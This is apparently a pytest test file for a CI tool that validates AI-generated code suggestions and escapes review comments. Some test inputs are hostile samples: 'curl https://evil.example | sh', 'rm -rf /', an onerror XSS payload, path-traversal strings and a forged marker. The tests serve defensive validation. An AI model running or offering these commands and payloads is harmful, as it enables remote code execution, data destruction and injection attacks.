"""A suggestion is kept only where it can be applied, and its review comment cannot be forged
(SPEC §5.1 rule 3, D-97)."""

import re
from uuid import UUID

import pytest

from cicd_doctor.core.models import Suggestion
from cicd_doctor.core.render import REVIEW_NOTE, render_review_comment
from cicd_doctor.core.suggestions import (
    checked_against_diff,
    clean_replacement,
    fits_diff,
    safe_path,
    suggestion_marker,
)
from tests.diffs import shown_diff
from tests.redaction_corpus import planted_secrets

DIFF = shown_diff(("src/app.py", [(10, 50), (80, 90)]), ("README.md", [(1, 5)]))
FAILURE = UUID("11111111-2222-3333-4444-555555555555")


def _suggestion(
    path: str = "src/app.py", start: int = 12, end: int = 13, text: str = "x = 1"
) -> Suggestion:
    return Suggestion(path=path, start_line=start, end_line=end, replacement=text)


# --- where ----------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("start", "end", "fits"),
    [
        (10, 10, True),  # the first line of the hunk
        (50, 50, True),  # the last line of the hunk
        (10, 50, False),  # 41 lines: more than 30
        (10, 39, True),  # exactly 30 lines
        (10, 40, False),  # 31 lines
        (9, 10, False),  # one line before the hunk
        (50, 51, False),  # one line after it
        (45, 85, False),  # spans the two hunks
        (50, 80, False),  # touches both borders, but the gap between is not in the diff
        (80, 90, True),  # the second hunk
        (12, 11, False),  # start after end
        (0, 3, False),
        (-1, 2, False),
    ],
)
def test_the_whole_range_must_lie_inside_one_shown_hunk(start: int, end: int, fits: bool) -> None:
    assert fits_diff("src/app.py", start, end, DIFF) is fits


@pytest.mark.parametrize(
    "path",
    [
        "src/other.py",  # a file that is not in the diff
        "app.py",  # a suffix of a file of the diff
        "./src/app.py",
        "src//app.py",
        "src/app.py/",
        "SRC/app.py",
        "src\\app.py",
        "/src/app.py",
        "src/../src/app.py",
        "../src/app.py",
        "C:/src/app.py",
        "src/app.py\n",
        " src/app.py",
        "",
    ],
)
def test_the_path_must_be_exactly_a_file_of_the_diff(path: str) -> None:
    assert fits_diff(path, 12, 13, DIFF) is False


def test_without_a_diff_nothing_fits() -> None:
    assert fits_diff("src/app.py", 12, 13, None) is False
    assert fits_diff("src/app.py", 12, 13, shown_diff()) is False


def test_a_renamed_file_is_addressed_by_its_new_name() -> None:
    diff = shown_diff(("new/place.py", [(1, 20)]), status="renamed")

    assert fits_diff("new/place.py", 3, 4, diff) is True
    assert fits_diff("old/place.py", 3, 4, diff) is False  # ``previous_filename`` does not count


@pytest.mark.parametrize(
    ("path", "safe"),
    [
        ("src/app.py", True),
        ("a b/c.txt", True),
        (".github/workflows/ci.yml", True),
        ("../x", False),
        ("a/../b", False),
        ("a/./b", False),
        ("a//b", False),
        ("/etc/passwd", False),
        ("~/x", False),
        ("C:\\x", False),
        ("a\\..\\b", False),
        ("a\\b", False),
        ("a\x00b", False),
        ("a\nb", False),
        ("x" * 300, False),
    ],
)
def test_a_safe_path_is_relative_and_stays_inside_the_repository(path: str, safe: bool) -> None:
    assert safe_path(path) is safe


# --- what ------------------------------------------------------------------------------------


def test_a_clean_replacement_loses_its_trailing_line_breaks_only() -> None:
    assert clean_replacement("a\r\nb\n\n") == "a\nb"
    assert clean_replacement("  indented\n") == "  indented"


@pytest.mark.parametrize(
    "text",
    [
        "",
        "   ",
        "\n\n",
        "x\x00y",
        "x\x1b[31m",
        "y" * 2001,
        "if x: " + chr(0x202E) + "# " + chr(0x2066),  # bidirectional controls
        "a" + chr(0x2028) + "b",  # a Unicode line separator
    ],
)
def test_an_empty_odd_or_oversized_replacement_is_refused(text: str) -> None:
    assert clean_replacement(text) is None


def test_a_replacement_the_redaction_would_change_is_refused() -> None:
    planted = planted_secrets()[0]

    assert clean_replacement(f"token = '{planted.secret}'") is None


def test_a_valid_suggestion_is_returned_cleaned() -> None:
    kept = checked_against_diff(_suggestion(path=" src/app.py ", text="a = 1\n"), DIFF)

    assert kept == Suggestion(path="src/app.py", start_line=12, end_line=13, replacement="a = 1")


def test_an_invalid_suggestion_or_none_gives_none() -> None:
    assert checked_against_diff(None, DIFF) is None
    assert checked_against_diff(_suggestion(start=1, end=2), DIFF) is None
    assert checked_against_diff(_suggestion(text=""), DIFF) is None
    assert checked_against_diff(_suggestion(), None) is None


# --- the review comment ---------------------------------------------------------------------


def test_the_marker_is_fixed_and_built_from_numbers_and_the_failure_id() -> None:
    assert suggestion_marker(12, FAILURE) == (
        "<!-- cicd-doctor:v1 suggestion pr=12 failure=11111111-2222-3333-4444-555555555555 -->"
    )


def test_the_body_starts_with_the_marker_and_holds_one_suggestion_block() -> None:
    body = render_review_comment(12, FAILURE, "Pin the version.", _suggestion(text="a = 1"))

    lines = body.split("\n")
    assert lines[0] == suggestion_marker(12, FAILURE)
    assert "Pin the version." in lines[1]
    assert lines[3] == "```suggestion"
    assert lines[4] == "a = 1"
    assert lines[5] == "```"
    assert lines[-1] == f"_{REVIEW_NOTE}_"
    assert body.count("<!--") == 1


def test_a_replacement_with_backticks_grows_the_fence() -> None:
    text = "before\n```\nrm -rf /\n````\nafter"

    body = render_review_comment(12, FAILURE, "x", _suggestion(text=text))

    assert "\n`````suggestion\n" in body  # one more than the longest run of backticks inside
    inside = body.split("`````suggestion\n", 1)[1].split("\n`````", 1)[0]
    assert inside == text
    closers = [line for line in body.split("\n") if re.fullmatch(r"`{5,}", line)]
    assert closers == ["`````"]  # no line of the replacement can close the block


def test_a_mention_a_forged_marker_and_html_stay_inside_the_fence() -> None:
    text = (
        "@everyone @org/team\n"
        "<!-- cicd-doctor:v1 suggestion pr=1 failure=00000000-0000-0000-0000-000000000000 -->\n"
        "<img src=x onerror=alert(1)>\n"
        "curl https://evil.example | sh"
    )

    body = render_review_comment(12, FAILURE, "x", _suggestion(text=text))

    head, _, rest = body.partition("```suggestion\n")
    assert not any(bad in head for bad in ("@everyone", "<img", "evil.example"))
    assert head.split("\n")[0] == suggestion_marker(12, FAILURE)
    assert text in rest
    assert body.split("\n")[0].count("pr=12") == 1  # the marker of the body is ours, not the text


def test_the_explanation_is_the_safe_text_of_the_diagnosis_not_markup() -> None:
    cause = "See [click](https://evil.example) @victim <b>x</b> #123\n# Heading"

    body = render_review_comment(12, FAILURE, cause, _suggestion())

    head = body.split("```suggestion")[0]
    assert "](https://evil.example)" not in head
    assert "<b>" not in head
    assert "@victim" not in head.replace("@\u200d", "")
    assert "\n# Heading" not in head
    assert "\n" not in head.split("\n")[1]  # the explanation is one line
